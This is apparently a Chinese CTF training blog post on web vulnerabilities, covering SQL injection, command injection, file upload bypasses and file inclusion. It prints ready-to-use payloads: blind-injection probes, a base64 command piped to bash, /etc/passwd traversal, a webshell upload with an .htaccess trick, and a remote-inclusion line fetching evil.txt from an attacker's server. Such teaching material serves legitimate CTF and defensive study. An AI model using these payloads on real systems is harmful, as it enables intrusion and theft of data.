#  漏洞挖掘实战系列（第2期）：Web专项（上） 注入类+文件类漏洞，吃透60%分值  
原创 点击关注👉  网络安全学习室   2026-01-06 02:15  
  
在CTF Web模块中，**注入类**  
和**文件类**  
漏洞占比高达60%，是新手快速拿分的核心赛道。本期聚焦2025年赛事高频真题，拆解SQL注入、命令注入、文件上传、文件包含四大漏洞的**识别方法+利用技巧+WAF绕过**  
，所有Payload和脚本均可直接复制使用！  
## 一、注入类漏洞：从报错到拿flag，核心是“打破语句结构”  
  
注入类漏洞的本质是**用户输入被当作代码执行**  
，核心技巧是用特殊字符打破原有语句结构，拼接恶意指令。  
### 1. SQL注入：CTF Web第一得分点  
#### （1）高频类型识别（3秒判断）  
<table><thead><tr><th style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">漏洞类型</span></section></th><th style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">测试Payload</span></section></th><th style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">响应特征</span></section></th></tr></thead><tbody><tr><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">字符型注入</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><code><span leaf="">id=1&#39;</span></code></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">页面返回SQL语法错误</span></section></td></tr><tr><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">数字型注入</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><code><span leaf="">id=1 and 1=2</span></code></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">页面从“有内容”变“无内容”</span></section></td></tr><tr><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">布尔盲注</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><code><span leaf="">id=1&#39; and length(flag)&gt;5--+</span></code></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">响应只有“成功/失败”两种状态</span></section></td></tr><tr><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">时间盲注</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><code><span leaf="">id=1&#39; and sleep(3)--+</span></code></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">页面加载时间明显延长</span></section></td></tr></tbody></table>#### （2）真题实战：2025强网杯「simple_sql」（布尔盲注）  
  
**场景**  
：靶场地址 http://xxx.ctfhub.com/detail.php?id=1  
，无报错提示，仅返回“查询成功/失败”。  
  
**核心步骤**  
：  
1. **确认注入点**  
：id=1' and 1=1--+  
 成功，id=1' and 1=2--+  
 失败 → 字符型布尔盲注。  
  
1. **批量爆破flag**  
：用Python脚本自动化提取（直接复制，修改url  
即可）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaLzURuoralYCOWe0tQO4wnKRkJ5lynztv0ib8OrNmY8E0QITPZYcvUiaUCXhaUs8Kdl2rUvHGHU3TrC25iawZEibTw/640?wx_fmt=png&from=appmsg "")  
  
#### （3）WAF绕过3个实用技巧  
- **注释绕过**  
：用/**/  
代替空格 → id=1'/**/and/**/1=1--+  
  
- **编码绕过**  
：URL编码特殊字符 → '  
 编码为 %27  
  
- **关键字拆分**  
：用MySQL注释符拆分关键字 → SEL/**/ECT  
  
### 2. 命令注入：执行系统命令，直接拿权限  
#### （1）漏洞识别：找危险函数  
  
CTF中常见危险函数：  
- PHP：system()  
、exec()  
、shell_exec()  
  
- Python：os.popen()  
、subprocess.call()  
  
**测试Payload**  
：输入127.0.0.1; ls  
（Linux）或127.0.0.1&dir  
（Windows）  
- 若页面返回目录列表 → 漏洞存在！  
  
#### （2）绕过过滤：3个必学方法  
1. **分隔符替换**  
：用&&  
/||  
/%0A  
（换行）代替;  
  
1. Payload：127.0.0.1%0Acat /flag  
  
1. **关键字替换**  
：用命令别名绕过黑名单  
  
1. cat  
 → tac  
（反向读取）、more  
、less  
  
1. Payload：127.0.0.1; tac /flag  
  
1. **编码绕过**  
：Base64编码命令  
  
1. Linux：echo Y2F0IC9mbGFn | base64 -d | bash  
  
1. 解释：Y2F0IC9mbGFn  
 是 cat /flag  
 的Base64编码  
  
## 二、文件类漏洞：上传恶意文件，一键getshell  
  
文件类漏洞的核心是**突破服务器限制，上传并执行恶意文件**  
，CTF中最常考**文件上传**  
和**文件包含**  
。  
### 1. 文件上传漏洞：2025西湖论剑真题拆解  
  
**场景**  
：靶场限制上传jpg/png  
格式，检测文件后缀，目标上传PHP一句话木马。  
#### （1）4个经典绕过方法  
<table><thead><tr><th style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">绕过类型</span></section></th><th style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">测试Payload</span></section></th><th style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">原理</span></section></th></tr></thead><tbody><tr><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">后缀绕过</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><code><span leaf="">shell.php.jpg</span></code></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">服务器只检测最后一个后缀</span></section></td></tr><tr><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">MIME类型绕过</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">改请求头</span><code><span leaf="">Content-Type: image/jpeg</span></code></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">服务器只验证MIME类型</span></section></td></tr><tr><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">内容绕过</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">在木马前加</span><code><span leaf="">GIF89a</span></code></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">服务器检测文件头是否为图片</span></section></td></tr><tr><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><code><span leaf="">.htaccess</span></code><section><span leaf="">配置绕过</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">上传</span><code><span leaf="">.htaccess</span></code><span leaf="">文件</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">让Apache把</span><code><span leaf="">jpg</span></code><span leaf="">文件解析为PHP</span></section></td></tr></tbody></table>#### （2）实操步骤（.htaccess绕过法）  
1. **上传****.htaccess****文件**  
，内容如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaLzURuoralYCOWe0tQO4wnKRkJ5lynztRoOPoP5H420FXgvDmmfd2ELPSN8ppeNic7bFO1ibI3JE4cUPNAvgbsHg/640?wx_fmt=png&from=appmsg "")  
  
1. **上传PHP一句话木马**  
，命名为shell.jpg  
，内容如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaLzURuoralYCOWe0tQO4wnKRkJ5lynztpNvz0wbqYhjTmSKq7Z7OicYevBCicSNYnVFQMAVQy8U5elWBNFfDunlQ/640?wx_fmt=png&from=appmsg "")  
  
1. **用蚁剑连接**  
：添加数据，URL填写http://xxx.ctfhub.com/upload/shell.jpg  
，密码cmd  
 → 成功getshell！  
  
### 2. 文件包含漏洞：读取源码，甚至RCE  
  
文件包含分为**本地文件包含（LFI）**  
 和**远程文件包含（RFI）**  
，CTF中LFI更常见。  
#### （1）漏洞识别  
  
**测试Payload**  
：?file=../../etc/passwd  
（Linux）或?file=../../windows/system32/drivers/etc/hosts  
（Windows）  
- 若页面返回系统文件内容 → 漏洞存在！  
  
#### （2）进阶利用：读取PHP源码  
  
当服务器开启PHP时，用php://filter  
编码读取源码：  
- Payload：?file=php://filter/read=convert.base64-encode/resource=../index.php  
  
- 步骤：获取Base64编码内容 → 解码得到源码 → 查找flag或其他漏洞。  
  
#### （3）RCE利用（远程文件包含）  
  
若服务器开启allow_url_include=On  
，可远程包含恶意脚本：  
- Payload：?file=http://你的服务器/evil.txt  
  
- evil.txt  
内容：<?php system("cat /flag"); ?>  
  
## 三、避坑清单（90%选手踩过的坑）  
1. **文件上传坑**  
：只改后缀不改文件头 → 被服务器内容检测拦截，记得加GIF89a  
。  
  
1. **SQL注入坑**  
：盲注时未加延时 → 靶机IP被封禁，脚本中可加time.sleep(0.5)  
。  
  
1. **命令注入坑**  
：忽略系统差异 → Linux用ls  
，Windows用dir  
，别搞混！  
  
## 四、福利+互动  
  
如果今天这篇注入+文件漏洞的内容对你有帮助，别忘了点个赞、在看，转发给一起打CTF的兄弟~  
  
**200节攻防教程，限免领！**  
  
想要的兄弟，**关注我+在后台发“学习”**  
，直接免费分享！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/iaLzURuoralYCOWe0tQO4wnKRkJ5lynztAXRyfZQthm7dJj6Y8iaVw2gAVVTNjTDZeSz442wtMJQu5zjOvkcdgpA/640?wx_fmt=jpeg&from=appmsg "")  
  
咱学漏洞挖掘和CTF，光看文章不够，这套教程里全是**实战演示**  
——从工具配置到漏洞利用，每一步都手把手教，跟着练就能上手！  
  
（注：资源领取入口在公众号后台，关注后发“学习”自动弹链接）  
  
  
